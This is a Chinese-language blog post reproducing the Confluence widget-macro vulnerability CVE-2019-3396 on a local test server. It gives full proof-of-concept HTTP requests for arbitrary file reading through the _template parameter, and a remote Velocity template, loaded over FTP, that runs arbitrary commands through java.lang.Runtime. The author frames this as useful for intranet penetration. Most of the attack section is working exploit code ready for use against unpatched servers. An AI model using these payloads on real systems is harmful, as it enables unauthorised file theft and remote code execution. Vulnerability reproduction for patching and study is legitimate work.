---
title: Confluence 未授权 RCE (CVE-2019-3396) 漏洞复现
date: 2019-4-10 23:22:39
categories: ftp
---
![文章开头](https://raw.githubusercontent.com/spacesec/images/master/blog/2019-4-10/1.png)
### 前言
&nbsp;&nbsp;&nbsp;&nbsp;Confluence是一个专业的企业知识管理与协同软件，也可以用于构建企业wiki。使用简单，但它强大的编辑和站点管理特征能够帮助团队成员之间共享信息、文档协作、集体讨论，信息推送。
                                                                                                                 ----百度百科  
### 任意文件读取
&nbsp;&nbsp;&nbsp;&nbsp;昨天刚看到关于confluence的RCE就心里痒痒,想自己本地复现一下,因为公司在内网的话基本都有自己的wiki平台,这对以后的内网渗透也是挺有帮助的。所以就有了今天的文章。白天搬砖晚上终于有点时间干点自己喜欢的事情啦!  
&nbsp;&nbsp;&nbsp;&nbsp;第一步我们肯定要首先搭建confluence的本地环境,所以首先到[官网](https://www.atlassian.com/software/confluence/download-archives)上下载6.9.0版本。  
![下载](https://raw.githubusercontent.com/spacesec/images/master/blog/2019-4-10/2.png)  
&nbsp;&nbsp;&nbsp;&nbsp;第二步开始安装,安装之后我们直接进入浏览器中进行初始化。这里有一个小插曲，我之前以为只有破解了才能呢使用，其实不是这样的，confluence官方给了我们了30天的免费时间，这个时间对我了做测试来说完全够了。我之前没搞清楚以为只有破解软件才能使用所以花了很长时间来破解这个软件，现在想想是非常无意义的，我们直接点击获得适用授权然后即使就是一直下一步下一步。  
![安装](https://raw.githubusercontent.com/spacesec/images/master/blog/2019-4-10/3.png)  
![安装](https://raw.githubusercontent.com/spacesec/images/master/blog/2019-4-10/4.png)  
&nbsp;&nbsp;&nbsp;&nbsp;第三步装完成之后我们创建一个话题，然后》其他宏》小工具连接器，之后按照提示输入相关的信息。  
![话题](https://raw.githubusercontent.com/spacesec/images/master/blog/2019-4-10/5.png)  
![话题](https://raw.githubusercontent.com/spacesec/images/master/blog/2019-4-10/6.png)  
&nbsp;&nbsp;&nbsp;&nbsp;第四步点击编辑然后用burp suite抓取数据包  
![抓取数据包](https://raw.githubusercontent.com/spacesec/images/master/blog/2019-4-10/7.png)    
&nbsp;&nbsp;&nbsp;&nbsp;第五步添加```"_template":"file:///C:\Windows\win.ini"```参数  
![添加参数](https://raw.githubusercontent.com/spacesec/images/master/blog/2019-4-10/8.png)  
&nbsp;&nbsp;&nbsp;&nbsp;第六步run如果结果发现可以读取win.ini文件则说明读取任意文件成功  
![结果](https://raw.githubusercontent.com/spacesec/images/master/blog/2019-4-10/9.png)  

```
完整POC
POST /rest/tinymce/1/macro/preview HTTP/1.1
Host: 127.0.0.1:8090
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0
Accept: text/html, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://127.0.0.1:8090/pages/editpage.action?pageId=65608
Content-Type: application/json; charset=utf-8
X-Requested-With: XMLHttpRequest
Content-Length: 257
Connection: close
Cookie: seraph.confluence=491522%3A4f60bb76841790e32509c6797835fc7d63038727; JSESSIONID=A5DA96C0FCF2E9CA0942821B2B94FFC1

{"contentId":"65608","macro":{"name":"widget","body":"","params":{"url":"https://youtube.com/watch?v=v5LxrcXiguE&list=PL6gx4Cwl9DGBmwvjJoWhM4Lg5MceSbsja&index=4","width":"400","height":"400","_template":"file:///C:\Windows\win.ini"}}}
```
### 任意代码执行
&nbsp;&nbsp;&nbsp;&nbsp;我们在这里是通过远程文件包含要进行命令执行   
&nbsp;&nbsp;&nbsp;&nbsp;第一步我们用Python在本地开启一个ftp服务器并且将需要包含的文件放在本地ftp的服务器上  
```
python -m pyftpdlib -p 2121
```
&nbsp;&nbsp;&nbsp;&nbsp;第二步我们修改_template参数包含远程文件,然后run发现可以实现任意命令执行  
![结果](https://raw.githubusercontent.com/spacesec/images/master/blog/2019-4-10/10.png)  


```
完整POC
POST /rest/tinymce/1/macro/preview HTTP/1.1
Host: 127.0.0.1:8090
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0
Accept: text/html, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://127.0.0.1:8090/pages/editpage.action?pageId=65608
Content-Type: application/json; charset=utf-8
X-Requested-With: XMLHttpRequest
Content-Length: 257
Connection: close
Cookie: seraph.confluence=491522%3A4f60bb76841790e32509c6797835fc7d63038727; JSESSIONID=A5DA96C0FCF2E9CA0942821B2B94FFC1

{"contentId":"65608","macro":{"name":"widget","body":"","params":{"url":"https://youtube.com/watch?v=v5LxrcXiguE&list=PL6gx4Cwl9DGBmwvjJoWhM4Lg5MceSbsja&index=4","width":"400","height":"400","_template":"ftp://localhost:2121/rce3.vm","command":"ipconfig"}}}

文件名:rec3.vm
#set ($exp="test")
#set ($a=$exp.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec($command))
#set ($input=$exp.getClass().forName("java.lang.Process").getMethod("getInputStream").invoke($a))
#set($sc = $exp.getClass().forName("java.util.Scanner"))
#set($constructor = $sc.getDeclaredConstructor($exp.getClass().forName("java.io.InputStream")))
#set($scan=$constructor.newInstance($input).useDelimiter("\\A"))
#if($scan.hasNext())
    $scan.next()
#end
```
